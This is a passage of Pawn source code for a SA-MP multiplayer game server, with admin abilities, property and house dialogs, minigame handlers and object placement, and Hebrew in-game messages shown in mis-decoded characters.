		format(dia,sizeof(dia),"%s\n\n\n" @c(lightyellow) "!юрчь ьъ фЁрф ю°хсф юф°юф фчу∙ф ∙ьъ SAMP-IL Ўхх·",dia);
		format(string,sizeof(string),@c(lightblue) "°юф чу∙ф! Єьщ· ь°юф %d",playerinfo[playerid][level]);
		ShowPlayerDialog(playerid,showall ? dialog_level : dialog_ni,DIALOG_STYLE_MSGBOX,string,dia,showall ? ("!ёЇ° ьыхьэ") : ("ётх°"),showall ? ("ётх°") : (""));
		Border(playerid,"update");
	}
	return 1;
}
//=[UseAdminAbility]============================================================
stock UseAdminAbility(playerid,ability,param=-999,targetid=INVALID_PLAYER_ID)
{
	if(!IsPlayerMAdmin(playerid) || playerinfo[playerid][admin] < AdminAbilities[ability][aaLevel]) return SendClientMessage(playerid,red," .рщя ьъ °ю· рующя юёЇщўф");
	new string[M_S], Float:p[3], in = GetPlayerInterior(playerid), wr = GetPlayerVirtualWorld(playerid), c = 0, playa[MAX_PLAYERS];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	if(targetid != INVALID_PLAYER_ID && playerinfo[playerid][attype] == at_player) if(!CommandAllowed(playerid,targetid,AdminAbilities[ability][aaName])) return 1;
	for(new i = 0, bool:synced = false; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
	{
		switch(playerinfo[playerid][attype])
		{
			case at_range: synced = playerinfo[playerid][range] != 0.0 && IsPlayerInRangeOfPoint(i,playerinfo[playerid][range],p[0],p[1],p[2]);
			case at_total: synced = true;
			case at_player: synced = targetid == i;
			case at_act: synced = bool:playerinfo[i][inact];
		}
		if(synced) playa[c++] = i;
		synced = false;
	}
	for(new i = 0, v = 0; i < c; i++) switch(ability)
	{
		case 0, 1: /* freeze/unfreeze */ SetFreeze(playa[i],(_:(!ability)));
		case 2: /* reset weapons */ ResetWeapons(playa[i]);
		case 3, 4: /* get/getv */
		{
			SetPlayerInterior(playa[i],in);
			SetPlayerVirtualWorld(playa[i],wr);
			if(ability == 3)
			{
				GetXYInFrontOfPoint(p[0],p[1],float(random(360)),5.0);
				SetPlayerPos(playa[i],p[0],p[1],p[2]);
				SetPlayerLookAt(playa[i],p[0],p[1]);
			}
			else
			{
				v = GetPlayerVehicleID(playa[i]);
				GetXYInFrontOfPoint(p[0],p[1],float(random(360)),float(randomEx(8,23)));
				SetVehiclePos(v,p[0],p[1],p[2]+2.0,i);
				SetVehicleVirtualWorld(v,wr);
				LinkVehicleToInterior(v,in);
			}
		}
		case 5: /* kill */
		{
			if(c > 20)
			{
				SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇЄхьф цх Єь щх·° ю-20 ∙чўЁщэ сх цюЁщ·");
				break;
			}
			SetPlayerHealth(playa[i],0.0);
		}
		case 6: /* full (only hp) */
		{
			SetPlayerHealth(playa[i],100.0);
			SetPlayerArmour(playa[i],0.0);
		}
		case 7: /* full */
		{
			SetPlayerHealth(playa[i],100.0);
			SetPlayerArmour(playa[i],100.0);
		}
		case 8: /* sethealth */
		{
			if(float(param) < 0.1)
			{
				SendClientMessage(playerid,red," .фЄ°ъ фющЁщюьщ ьрЇ∙°х· цх фхр 0.1");
				break;
			}
			SetPlayerHealth(playa[i],float(param));
		}
		case 9: /* setarmour */ SetPlayerArmour(playa[i],float(param));
		case 10: /* give money */
		{
			GiveMoney(playa[i],param);
			if(!playerinfo[playerid][range]) format(string,sizeof(string),"total (%d)%s [%d$]",playa[i],GetName(playa[i]),param);
			else format(string,sizeof(string),"range %.1f (%d)%s [%d$]",playerinfo[playerid][range],playa[i],GetName(playa[i]),param);
			Log("Attention",playerid,string);
		}
		case 11: /* give weapon */ GiveWeapon(playa[i],param,100000);
		case 12: /* take weapon */ if(PlayerHasWeapon(playa[i],param)) RemovePlayerWeapon(playa[i],param);
		case 13: /* add jetpack */ GiveJetpack(playa[i]);
		case 14: /* set color to inv */ SetPlayerColor(playa[i],rgba2hex(255,255,255,0));
		case 15: /* set color to normal */ SetPlayerToNormalColor(playa[i]);
		case 16: /* reset cheat warns */ playerinfo[playa[i]][acwarns] = 0;
		case 17: /* set time */ SetPlayerTime(playa[i],param > 0 && param < 24 ? param : 8,0);
		case 18: /* set skin */ SetPlayerSkin(playa[i],IsValidSkin(param) ? param : 0);
		case 19: /* set world */ SetPlayerVirtualWorld(playa[i],param);
		case 20: /* respawn */ SpawnPlayer(playa[i]);
		case 21: /* respawn vehicle */ SetVehicleToRespawn(GetPlayerVehicleID(playa[i]));
	}
	if(targetid == INVALID_PLAYER_ID)
	{
		if(!c) SendClientMessage(playerid,red," .фЇЄхьф ьр схЎЄф Єь рє рчу");
		else if(c == 1 && playa[0] == playerid) SendClientMessage(playerid,green," .фЇЄхьф схЎЄф °ў Єь ЄЎюъ");
		else if(c == 1 && playa[0] != playerid) SendClientMessage(playerid,green," .фЇЄхьф схЎЄф °ў Єь ю∙·ю∙ рчу");
		else
		{
			if(strlen(AdminAbilities[ability][aaDone]) > 0)
			{
				valstr(string,param);
				if(playerinfo[playerid][attype] == at_total)
				{
					if(param != -999) format(string,sizeof(string)," * .%sыь ф∙чўЁщэ с∙°· " @c(white) "%s",strreplace(AdminAbilities[ability][aaDone],"X",string),GetName(playerid));
					else format(string,sizeof(string)," * .%sыь ф∙чўЁщэ с∙°· " @c(white) "%s",AdminAbilities[ability][aaDone],GetName(playerid));
					SendClientMessageToAll(lightblue,string);
				}
				else if(playerinfo[playerid][attype] == at_range)
				{
					if(param != -999) format(string,sizeof(string)," * .%s%d ф∙чўЁщэ ∙фщх сю°чў %.1f ююЁх " @c(white) "%s",strreplace(AdminAbilities[ability][aaDone],"X",string),playerinfo[playerid][range],c,GetName(playerid));
					else format(string,sizeof(string)," * .%s%d ф∙чўЁщэ ∙фщх сю°чў %f ююЁх " @c(white) "%s",AdminAbilities[ability][aaDone],c,playerinfo[playerid][range],GetName(playerid));
					for(new i = 0; i < c; i++) SendClientMessage(playa[i],lightblue,string);
				}
				else if(playerinfo[playerid][attype] == at_act)
				{
					if(param != -999) format(string,sizeof(string)," * .%sыь ф∙чўЁщэ ∙сЇЄщьх· " @c(white) "%s",strreplace(AdminAbilities[ability][aaDone],"X",string),GetName(playerid));
					else format(string,sizeof(string)," * .%sыь ф∙чўЁщэ ∙сЇЄщьх· " @c(white) "%s",AdminAbilities[ability][aaDone],GetName(playerid));
					for(new i = 0; i < c; i++) SendClientMessage(playa[i],lightblue,string);
				}
			}
			else
			{
				format(string,sizeof(string)," * .фЇЄхьф \"%s\" схЎЄф хьр Ё°∙юф сЎ'рш ьыхьэ",AdminAbilities[ability][aaName]);
				SendClientMessage(playerid,lightblue,string);
			}
		}
	}
	else
	{
		format(string,sizeof(string),"%s сщЎЄ р· фЇЄхьф \"%s\" Єь",GetName(targetid),AdminAbilities[ability][aaName]);
		AdminInfo(playerid,string);
	}
	playerinfo[playerid][attype] = at_none;
	return 1;
}
//=[SetPlayerScroll]=============================================================
stock SetPlayerScroll(playerid,scid)
{
	playerinfo[playerid][scroll] = scid;
	playerinfo[playerid][scrolltime] = Scrolls[scid][scTime]*60;
	playerinfo[playerid][scrollusing] = 0;
}
//=[RemovePlayerScroll]=========================================================
stock RemovePlayerScroll(playerid)
{
	if(playerinfo[playerid][scrollusing]) RemovePlayerAttachedText(playerid);
	playerinfo[playerid][scroll] = scroll_none;
	playerinfo[playerid][scrolltime] = 0;
	playerinfo[playerid][scrollusing] = 0;
	if(playerinfo[playerid][indialog] == dialog_scroll || playerinfo[playerid][indialog] == dialog_scroll2) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рЇ∙°хщх· ёў°хь",@c(red) ".фёў°хь ∙ьъ ьр ўщщэ щх·°","OK","");
}
//=[EndZombies]=================================================================
stock EndZombies(reason[],adminid)
{
	new string[M_S];
	assert zombiesinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .фюьчюф схшьф");
	else format(string,sizeof(string)," .%s юьчю· фцхюсщэ схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inzombies] || playerinfo[i][waitzombies]))
		{
			if(playerinfo[i][inzombies])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙юьчю· фцхюсщэ схшьф");
				GiveMoney(i,join_act,25);
			}
			playerinfo[i][inzombies] = 0, playerinfo[i][waitzombies] = 0, playerinfo[i][zombiesid] = 0, playerinfo[i][zombiesweapon] = -1;
			playerinfo[i][inact] = 0;
		}
	}
	zombiesinfo[0] = 0, zombiesinfo[1] = 0, zombiesinfo[2] = 0;
	KillTimer(zombiesinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[CreateShipObject]===========================================================
stock CreateShipObject(objectid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz)
{
	ssObject[ssObjects] = CreateObject(objectid,x,y,z,rx,ry,rz,object_show_distance);
	ssObjectPos[ssObjects][0] = x;
	ssObjectPos[ssObjects][1] = y;
	ssObjectPos[ssObjects][2] = z;
	ssObjectPos[ssObjects][3] = rx;
	ssObjectPos[ssObjects][4] = ry;
	ssObjectPos[ssObjects][5] = rz;
	ssObjects++;
	return ssObject[ssObjects];
}
//=[ShowPlayerProperty]=========================================================
stock ShowPlayerProperty(playerid,p)
{// amit
	new dia[400];
	if(propinfo[p][owner] == playerid)
	{
		format(dia,sizeof(dia),@c(green) "!" @c(lightgreen) "%s" @c(green) " - с°хъ фср ьЁыё ∙ьъ",propinfo[p][pname]);
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :фЁыё фцф Єхьф",dia,propinfo[p][pcost]);
		format(dia,sizeof(dia),"%s\n" @c(blue) "(" @c(lightblue) "$%d" @c(blue) " :ючщ° ьЇщ рчхц фЁыёщэ фЁхычщ)",dia,propper(propinfo[p][pcost]));
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :ы∙ўЁщ· р· фЁыё фхр Єьф",dia,playerinfo[playerid][propcost][p]);
		if(propinfo[p][spid] > 0) format(dia,sizeof(dia),"%s\n\n" @c(grey) ":хфхр Ёыё ющхчу\n%s",dia,propinfo[p][sptext]);
		else
		{
			format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :хр·ф юўсь Єьщх сыь ∙·щ уўх·",dia,propinfo[p][pearning]);
			format(dia,sizeof(dia),"%s\n" @c(blue) "(" @c(lightblue) "$%d" @c(blue) " :ю∙ых°· ьЇщ рчхц фЁыёщэ фЁхычщ)",dia,propper(propinfo[p][pearning]));
		}
		format(dia,sizeof(dia),"%s\n\n" @c(yellow) ".·хыь ьюых° р· фЁыё фцф рэ рщЁъ °хЎф рх·х щх·°\nрэ ·юых°, ·°ххщч чЎщ юфючщ° ∙∙щью· - $%d",dia,playerinfo[playerid][propcost][p]/2);
		ShowPlayerDialog(playerid,dialog_property,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёыё",dia,"юыщ°ф","ётх°");
	}
	else
	{
		new own[64];
		format(own,sizeof(own),"/DM/Properties/%d.ini",p);
		format(own,sizeof(own),fgetstring(own,"Owner"));
		format(dia,sizeof(dia),@c(green) "!" @c(lightgreen) "%s" @c(green) " с°хъ фср ьЁыё",propinfo[p][pname]);
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :ючщ° фЁыё фцф фхр",dia,propinfo[p][pcost]);
		format(dia,sizeof(dia),"%s\n" @c(blue) "(" @c(lightred) "$%d" @c(blue) " :ючщ° ьЇщ рчхц фЁыёщэ фЁхычщ)",dia,propper(propinfo[p][pcost]));
		if(propinfo[p][spid] > 0) format(dia,sizeof(dia),"%s\n\n" @c(grey) ":хфхр Ёыё ющхчу\n%s",dia,propinfo[p][sptext]);
		else
		{
			format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :хф°ххч ∙ьх сыь ∙·щ уўх· фхр",dia,propinfo[p][pearning]);
			format(dia,sizeof(dia),"%s\n" @c(blue) "(" @c(lightblue) "$%d" @c(blue) " :ю∙ых°· ьЇщ рчхц фЁыёщэ фЁхычщ)",dia,propper(propinfo[p][pearning]));
		}
		if(equal(own,"None")) format(dia,sizeof(dia),"%s\n\n" @c(blue) ".Ёыё цф ьр ЁўЁф Єь щущ рє рчу хьыя фхр ЇЁхщ ьўЁщщф",dia);
		else
		{
			if(propinfo[p][owner] != INVALID_PLAYER_ID) format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "(ID: %03d) %s" @c(blue) " :фсЄьщэ фЁхычщщэ ∙ь фЁыё",dia,propinfo[p][owner],own);
			else format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "%s" @c(blue) " :фсЄьщэ фЁхычщщэ ∙ь фЁыё",dia,own);
		}
		ShowPlayerDialog(playerid,dialog_property,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёыё",dia,"ўЁщщф","ётх°");
	}
	return 1;
}
//=[ShowPlayerHouse]============================================================
stock ShowPlayerHouse(playerid,h)
{
	new dia[256], own[64], id = -1;
	format(own,sizeof(own),"/DM/Houses/%d.ini",h);
	format(own,sizeof(own),fgetstring(own,"Owner"));
	for(new i = 0; i < MAX_PLAYERS_ && id == -1; i++) if(IsPlayerConnected(i) && equal(GetName(i),own)) id = i;
	if(id == playerid)
	{
		format(dia,sizeof(dia),@c(green) "!с°хъ фср ьсщ· ∙ьъ - " @c(lightgreen) "%s" @c(green),HouseSizeName(h));
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :ўЁщ· р· фсщ· фцф сёыхэ",dia,houseinfo[h][hcost]);
		format(dia,sizeof(dia),"%s\n" @c(lightblue) "%d" @c(blue) " :тхуь фсщ·",dia,houseinfo[h][hsize]);
		format(dia,sizeof(dia),"%s\n" @c(lightblue) "%d" @c(blue) " :юёЇ° фсщ·",dia,h);
		format(dia,sizeof(dia),"%s\n\n" @c(yellow) "ьчї Єь юў∙ фўЇщЎф | /h ь∙щтх° рь фсщ·",dia);
		ShowPlayerDialog(playerid,dialog_house,DIALOG_STYLE_MSGBOX,@c(lightblue) "сщ·",dia,"·Ї°щш","ётх°");
	}
	else
	{
		format(dia,sizeof(dia),@c(green) "!с°хъ фср ьсщ· - " @c(lightgreen) "%s" @c(green),HouseSizeName(h));
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "$%d" @c(blue) " :ючщ° фсщ·",dia,houseinfo[h][hcost]);
		format(dia,sizeof(dia),"%s\n" @c(lightblue) "%d" @c(blue) " :тхуь фсщ·",dia,houseinfo[h][hsize]);
		format(dia,sizeof(dia),"%s\n" @c(lightblue) "%d" @c(blue) " :юёЇ° фсщ·",dia,h);
		if(equal(own,"None"))
		{
			format(dia,sizeof(dia),"%s\n\n" @c(yellow) ".фсщ· фцф ьр ∙щщъ ьрє рчу, ·хыь ьўЁх· рх·х",dia);
			id = -2;
		}
		else
		{
			if(id != -1) format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "(ID: %03d) %s" @c(blue) " :сЄь фсщ·",dia,id,own);
			else format(dia,sizeof(dia),"%s\n\n" @c(lightblue) "%s" @c(blue) " :сЄь фсщ·",dia,own);
			if(playerinfo[playerid][houseacc][h]) format(dia,sizeof(dia),"%s\n\n" @c(yellow) "ьчї Єь юў∙ фўЇщЎф | /oh %d щ∙ ьъ тщ∙ф ьсщ·! ь∙щтх° рь фсщ·",dia,h);
		}
		ShowPlayerDialog(playerid,dialog_house,DIALOG_STYLE_MSGBOX,@c(lightblue) "сщ·",dia,id == -2 ? ("ўЁщщф") : ("ыЁщёф"),"ётх°");
	}
	return 1;
}
//=[HouseSizeName]==============================================================
stock HouseSizeName(h)
{
	new sizename[12];
	switch(houseinfo[h][hsize])
	{
		case 1: sizename = "чу°";
		case 2: sizename = "сщ·";
		case 3: sizename = "сщ· тухь";
		case 4: sizename = "хщьф";
		case 5: sizename = "юьхя";
	}
	return sizename;
}
//=[CanTeleportSVehicle]========================================================
stock CanTeleportSVehicle(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return 1;
	new v = GetPlayerVehicleID(playerid);
	if(!vehicleinfo[v][vspecial]) return 1;
	switch(vehicleinfo[v][vspecialid])
	{
		case SV_SUBMARINE, SV_DOLPHIN1, SV_DOLPHIN2, SV_BALL: return 0;
		case SV_TRANSHELI, SV_GHOSTSHIP: return 1;
		default: return 0;
	}
	return 1;
}
//=[GoIntoHouse]================================================================
stock GoIntoHouse(playerid,h)
{
	new world = -1;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inhouse] == h) world = i;
	if(world == -1) world = GetEmptyWorld();
	if(world == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьфыЁщё рх·ъ ьсщ·, рЁр Ёёф ∙хс юрхч° щх·°");
	SetPlayerVirtualWorld(playerid,world);
	playerinfo[playerid][inhouse] = h;
	if(houseinfo[h][hsize] == 1)
	{
		SetPlayerPos(playerid,22.7075,1403.4500,1084.4370);
		SetPlayerFacingAngle(playerid,5.0134);
		SetPlayerInterior(playerid,5);
	}
	else if(houseinfo[h][hsize] == 2)
	{
		SetPlayerPos(playerid,225.1839,1239.5336,1082.1406);
		SetPlayerFacingAngle(playerid,89.0728);
		SetPlayerInterior(playerid,2);
	}
	else if(houseinfo[h][hsize] == 3)
	{
		SetPlayerPos(playerid,225.756989,1240.000000,1082.149902);
		//SetPlayerFacingAngle(playerid,273.2310);
		SetPlayerInterior(playerid,2);
	}
	else if(houseinfo[h][hsize] == 4)
	{
		SetPlayerPos(playerid,2324.4167,-1147.2296,1050.7101);
		SetPlayerFacingAngle(playerid,0.6684);
		SetPlayerInterior(playerid,12);
	}
	else if(houseinfo[h][hsize] == 5)
	{
		SetPlayerPos(playerid,139.9729,1368.6322,1083.8633);
		SetPlayerFacingAngle(playerid,358.9973);
		SetPlayerInterior(playerid,5);
	}
	SendClientMessage(playerid,yellow," .ЁыЁё· рь фсщ·; ьчї ∙хс Єь юў∙ фщЎщрф ю°ыс Єь юЁ· ьЎр· ююЁх");
	GameTextForPlayer(playerid,"~g~press ~r~~k~~VEHICLE_ENTER_EXIT~ ~g~to quit from the house",2000,5);
	HidePlayerDialog(playerid);
	return 1;
}
//=[GetVehicleFuel]=============================================================
stock GetVehicleFuel(modelid)
{
	new f = -1;
	switch(GetVehicleType(modelid,1))
	{
		case 0: f = 100;
		case 1: f = (modelid == 481 || modelid == 509 || modelid == 510) ? -1 : 100;
		default: f = -1;
	}
	return f;
}
//=[StopPetAttacking]===========================================================
stock StopPetAttacking(playerid)
{
	new Float:p[4];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	KillTimer(playerinfo[playerid][pet][4]);
	playerinfo[playerid][pet][3] = 0;
	AttachObjectToPlayer(playerinfo[playerid][pet][1],playerid,Pets[playerinfo[playerid][pet][0]][petOffset][0],Pets[playerinfo[playerid][pet][0]][petOffset][1],Pets[playerinfo[playerid][pet][0]][petOffset][2],Pets[playerinfo[playerid][pet][0]][petOffset][3],Pets[playerinfo[playerid][pet][0]][petOffset][4],Pets[playerinfo[playerid][pet][0]][petOffset][5]);
	return 1;
}
//=[UpdatePlayerJumpPower]======================================================
stock UpdatePlayerJumpPower(playerid)
{
	new string[64], PlayerText:td;
	format(string,sizeof(string),"Jump: %s",strs("+",playerinfo[playerid][jumpower]));
	td = CreatePlayerTextDraw(playerid,146.000000,362.000000,string);
	PlayerTextDrawBackgroundColor(playerid,td,255);
	PlayerTextDrawFont(playerid,td,1);
	PlayerTextDrawLetterSize(playerid,td,0.480000,1.400000);
	PlayerTextDrawColor(playerid,td,darkgreen);
	PlayerTextDrawSetOutline(playerid,td,1);
	PlayerTextDrawSetProportional(playerid,td,1);
	ShowTempTextDraw(playerid,900,temptext_jump,td,1);
	return 1;
}
//=[ReloadCPs]==================================================================
stock ReloadCPs(playerid)
{
	if(playerinfo[playerid][specp]) return 1;
	DisablePlayerCheckpoint(playerid);
	playerinfo[playerid][cp] = -1;
	for(new i = 0; i < cps && playerinfo[playerid][cp] == -1; i++) if(IsPlayerInDynamicArea(playerid,cpinfo[i][cparea]) && cpinfo[i][cpactive] && (cpinfo[i][cptype] != cp_abank || (cpinfo[i][cptype] == cp_abank && IsPlayerMAdmin(playerid))))
	{
		SetPlayerCheckpoint(playerid,cpinfo[i][cpx],cpinfo[i][cpy],cpinfo[i][cpz],cpinfo[i][cpsize]);
		playerinfo[playerid][cp] = i;
		return 1;
	}
	return 1;
}
//=[EndGlass]===================================================================
stock EndGlass(reason[],adminid)
{
	new string[M_S];
	assert glassinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .·ч°х· фтьрё схшьф");
	else format(string,sizeof(string)," .%s ·ч°х· фтьрё схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inglass] || playerinfo[i][waitglass]))
		{
			if(playerinfo[i][inglass])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· фтьрё схшьф");
				GiveMoney(i,join_act,25);
			}
			playerinfo[i][inglass] = 0, playerinfo[i][waitglass] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	glassinfo[0] = 0, glassinfo[1] = 0, glassinfo[2] = 0;
	KillTimer(glassinfo[3]);
	ReloadGlass();
	thereIsAct = false;
	return 1;
}
//=[ReloadGlass]================================================================
stock ReloadGlass()
{
	for(new i = 0; i < sizeof(glassobj); i++) if(glassobj[i] != -1) DestroySObject(glassobj[i]);
	glassobj[0] = CreateSObject(1649,3199.75,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[1] = CreateSObject(1649,3199.75,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[2] = CreateSObject(1649,3199.75,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[3] = CreateSObject(1649,3199.75,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[4] = CreateSObject(1649,3199.75,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[5] = CreateSObject(1649,3199.75,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[6] = CreateSObject(1649,3195.31,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[7] = CreateSObject(1649,3195.31,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[8] = CreateSObject(1649,3195.31,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[9] = CreateSObject(1649,3195.31,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[10] = CreateSObject(1649,3195.31,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[11] = CreateSObject(1649,3195.31,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[12] = CreateSObject(1649,3190.87,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[13] = CreateSObject(1649,3190.87,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[14] = CreateSObject(1649,3190.87,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[15] = CreateSObject(1649,3190.87,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[16] = CreateSObject(1649,3190.87,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[17] = CreateSObject(1649,3190.87,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[18] = CreateSObject(1649,3186.44,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[19] = CreateSObject(1649,3186.44,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[20] = CreateSObject(1649,3186.44,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[21] = CreateSObject(1649,3186.44,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[22] = CreateSObject(1649,3186.44,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[23] = CreateSObject(1649,3186.44,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[24] = CreateSObject(1649,3182.01,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[25] = CreateSObject(1649,3182.01,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[26] = CreateSObject(1649,3182.01,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[27] = CreateSObject(1649,3182.01,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[28] = CreateSObject(1649,3182.01,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[29] = CreateSObject(1649,3182.01,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[30] = CreateSObject(1649,3177.57,5125.33,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[31] = CreateSObject(1649,3177.57,5122.00,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[32] = CreateSObject(1649,3177.57,5118.67,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[33] = CreateSObject(1649,3177.57,5115.34,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[34] = CreateSObject(1649,3177.57,5112.01,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	glassobj[35] = CreateSObject(1649,3177.57,5108.68,30.93,-90.00,0.00,0.00,object_show_distance,0,world_glass);
	return 1;
}
//=[GetWeatherName]=============================================================
stock GetWeatherName()
{
	new wea[16];
	switch(israelWeather[0])
	{
		case 1: wea = "юЄхЁя чьўщ·";
		case 2: wea = "юЄхЁя";
		case 3: wea = "ёхЇх· °Єющэ";
		case 4: wea = "т∙э ющущ ЇЄэ";
		case 5: wea = "сфщ°";
		case 6: wea = "рсщъ";
		case 7: wea = "∙ьт ысу";
		case 8: wea = "т∙э юЄх°с с∙ьт";
		case 9: wea = "°хч Єцф";
		case 10: wea = "т∙э ьЇ°ўщэ";
		case 11: wea = "чхэ ысу";
		case 12: wea = "т∙э юўхющ";
		case 13: wea = "фсщь";
		case 14: wea = "ЄЁЁх· тсхфф";
		case 15: wea = "сфщ° хчэ";
		default: wea = "ьр щухЄ";
	}
	return wea;
}
//=[SetVehicleParams]===========================================================
stock SetVehicleParams(v,engine=VEHICLE_PARAMS_UNSET,lights=VEHICLE_PARAMS_UNSET,alarm=VEHICLE_PARAMS_UNSET,doors=VEHICLE_PARAMS_UNSET,bonnet=VEHICLE_PARAMS_UNSET,boot=VEHICLE_PARAMS_UNSET,_objective=VEHICLE_PARAMS_UNSET) return SetVehicleParamsEx(v,engine,lights,alarm,doors,bonnet,boot,_objective);
//=[GetVehicleParams]===========================================================
stock GetVehicleParams(v,c)
{
	new p[2];
	GetVehicleParamsEx(v,p[_:(c == 'e')],p[_:(c == 'l')],p[_:(c == 'a')],p[_:(c == 'd')],p[_:(c == 'b')],p[_:(c == 't')],p[_:(c == 'o')]);
	return p[1];
}
//=[HandleClassSelectionObjects]================================================
stock HandleClassSelectionObjects()
{
	if(csobjects == 0)
	{
		#define CO(%1,%2,%3,%4,%5,%6,%7) csobject[csobjects++] = CreateSObject(%1,%2,%3,csmodel >= 1 && csmodel <= 3 ? ((%4)-1.2) : %4,%5,%6,%7,6000.0,0,world_reqclass)
		CO(csmodels[csmodel],-2651.77,-22.22,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.50,-22.16,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.09,-22.16,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.69,-22.17,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.30,-22.18,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.30,-22.18,6.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.32,-22.18,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.72,-22.17,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.10,-22.16,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.50,-22.16,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.49,-22.16,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.49,-22.16,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2655.10,-22.16,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.70,-22.17,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2654.32,-22.18,7.79,0.00,0.00,0.00);
